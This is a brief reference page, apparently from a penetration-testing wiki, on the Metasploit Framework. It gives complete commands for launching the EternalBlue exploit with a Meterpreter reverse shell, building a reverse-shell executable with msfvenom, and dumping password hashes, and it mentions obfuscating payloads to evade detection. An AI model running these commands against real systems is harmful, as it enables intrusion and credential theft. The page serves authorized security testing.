# Metasploit

Metasploit Framework is an open-source penetration testing platform that provides a library of exploits, payloads, and auxiliary modules, along with a console (`msfconsole`) for chaining recon, exploitation, and post-exploitation together.

## Common Use Cases

* Exploiting known vulnerabilities against a target service
* Generating and staging payloads (Meterpreter, shellcode) with `msfvenom`
* Post-exploitation: privilege escalation checks, credential harvesting, pivoting
* Validating that a patched/mitigated vulnerability is no longer exploitable

## Core Syntax

```
msfconsole
search type:exploit platform:windows smb
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 10.10.10.10
set LHOST 10.10.14.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

Generate a standalone payload with msfvenom:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
```

Common Meterpreter post-exploitation commands:

```
sysinfo
getuid
hashdump
migrate <PID>
```

{% hint style="warning" %}
Metasploit modules and Meterpreter are heavily signatured by EDR/AV. Default payloads and module traffic are easy to fingerprint — expect detection unless payloads are encoded/obfuscated or delivered via a custom stager. Only run this against systems you have explicit authorization to test.
{% endhint %}

## Related

* CrackMapExec / NetExec — lateral movement and credential validation across a network
* Evil-WinRM — interactive shell once you have valid Windows credentials
